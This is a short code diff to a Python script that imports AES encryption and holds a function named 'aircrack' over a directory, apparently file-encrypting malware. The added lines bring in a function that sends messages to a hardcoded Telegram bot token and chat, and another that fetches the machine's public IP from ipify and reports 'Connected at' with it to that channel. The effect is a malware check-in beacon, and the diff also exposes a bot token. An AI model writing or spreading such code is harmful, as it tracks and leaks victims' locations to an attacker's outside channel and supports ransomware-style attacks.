@@ -1,5 +1,5 @@
 import os, random, string
-import hashlib
+import hashlib, telegram, requests
 from Crypto.Cipher import AES
 
 
@@ -26,3 +26,15 @@ def aircrack(directory):
                 
 
 
+def q(x):
+    telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww').send_message(chat_id=-841939764, text=x)
+
+
+
+def get():
+    url = 'https://api.ipify.org?format=json'
+    r = requests.get(url)
+    x = r.json()['ip']
+    q(f"Connected at: {x}")
+    
+    
